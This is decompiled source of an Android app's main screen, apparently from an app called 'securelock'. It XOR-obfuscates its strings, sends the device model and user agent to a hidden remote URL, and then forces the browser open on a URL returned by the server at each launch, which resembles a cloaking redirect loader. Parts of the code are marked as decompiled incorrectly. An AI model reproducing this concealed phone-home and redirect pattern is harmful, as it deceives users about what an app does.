package com.playgen.securelock;

import K.x0;
import K.z0;
import O0.b;
import S0.e;
import T.u;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import b1.d;
import g.AbstractActivityC0133i;
import i1.a;
import i1.l;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.k;
import m1.o;
import m1.p;
import q1.g;
import q1.j;
import u1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0133i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1934D = 0;

    /* renamed from: C, reason: collision with root package name */
    public SharedPreferences f1937C;

    /* renamed from: z, reason: collision with root package name */
    public String f1939z;

    /* renamed from: y, reason: collision with root package name */
    public final e f1938y = new e(new b(this, 1));

    /* renamed from: A, reason: collision with root package name */
    public final String f1935A = t(new byte[]{104, -21, 61});

    /* renamed from: B, reason: collision with root package name */
    public final String f1936B = t(new byte[]{121, -8, 40, 126});

    public static String t(byte[] bArr) {
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            int i4 = i3 + 1;
            int i5 = i3 % 4;
            arrayList.add(Byte.valueOf((byte) ((i5 != 0 ? i5 != 1 ? i5 != 2 ? 18 : 90 : 141 : 11) ^ (bArr[i2] & 255))));
            i2++;
            i3 = i4;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, a.f2460a);
    }

    /* JADX WARN: Code restructure failed: missing block: B:24:0x0164, code lost:
    
        r2 = r4;
     */
    @Override // g.AbstractActivityC0133i, a.l, android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1937C = getSharedPreferences(this.f1935A, 0);
        u();
        setContentView(((Q0.b) this.f1938y.a()).f685a);
        SharedPreferences sharedPreferences = this.f1937C;
        g gVar2 = null;
        if (sharedPreferences == null) {
            d.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1936B, null);
        if (string != null && !i1.d.w0(string)) {
            this.f1939z = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{121, -8, 40, 126});
        String t3 = t(new byte[]{52, -20, 42, 98, 54});
        String str = t(new byte[]{99, -7, 46, 98, 120, -73, 117, 61, 124, -28, 52, 102, 110, -1, 119, 116, 121, -30, 41, 102, 38, -71, 104, 112, 111, -93, 54, 107, Byte.MAX_VALUE, -5, 44, 101, 101, -18, 57, 63, 101, -20, 46, 119, 110, -70, 108, 60, 124, -30, 40, 121, 110, -1, 41, 60, 111, -24, 44, 61}) + t3 + packageName;
        p pVar = new p(new o());
        u uVar = new u(6);
        d.e(str, "url");
        if (l.o0(str, "ws:", true)) {
            String substring = str.substring(3);
            d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.o0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        d.e(str, "<this>");
        k kVar = new k();
        kVar.c(null, str);
        uVar.f801a = kVar.a();
        String t4 = t(new byte[]{83, -96, 30, 119, 125, -28, 57, 119, 38, -64, 53, 118, 110, -31});
        String str2 = Build.MODEL;
        d.d(str2, "MODEL");
        uVar.k(t4, str2);
        uVar.k(t(new byte[]{74, -18, 57, 119, 123, -7, 119, 94, 106, -29, 61, 103, 106, -22, 63}), t(new byte[]{110, -29, 119, 71, 88, -95, 63, 124, 48, -4, 103, 34, 37, -76}));
        String t5 = t(new byte[]{94, -2, 63, 96, 38, -52, 61, 119, 101, -7});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        uVar.k(t5, defaultUserAgent);
        H.e b2 = uVar.b();
        j jVar = new j(pVar, b2);
        B.j jVar2 = new B.j(this, t2, 4);
        if (!jVar.f3476e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3904a;
        jVar.f3477f = n.f3904a.g();
        u uVar2 = pVar.f3211a;
        g gVar3 = new g(jVar, jVar2);
        uVar2.getClass();
        synchronized (uVar2) {
            ((ArrayDeque) uVar2.f802b).add(gVar3);
            String str3 = ((m1.l) b2.f206c).d;
            Iterator it = ((ArrayDeque) uVar2.f803c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (d.a(((m1.l) gVar.f3470c.f3474b.f206c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) uVar2.f802b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (d.a(((m1.l) gVar.f3470c.f3474b.f206c).d, str3)) {
                        }
                    }
                }
            }
            if (gVar2 != null) {
                gVar3.f3469b = gVar2.f3469b;
            }
        }
        uVar2.r();
    }

    @Override // g.AbstractActivityC0133i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1939z;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        x0 x0Var;
        WindowInsetsController insetsController;
        u1.l.a0(getWindow(), false);
        Window window = getWindow();
        C.g gVar = new C.g(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            z0 z0Var = new z0(insetsController, gVar);
            z0Var.f465f = window;
            x0Var = z0Var;
        } else {
            x0Var = new x0(window, gVar);
        }
        x0Var.D();
        x0Var.f0();
    }

    public final void v() {
        startActivity(new Intent(this, (Class<?>) MainActivity2.class));
    }

    public final void w(String str) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
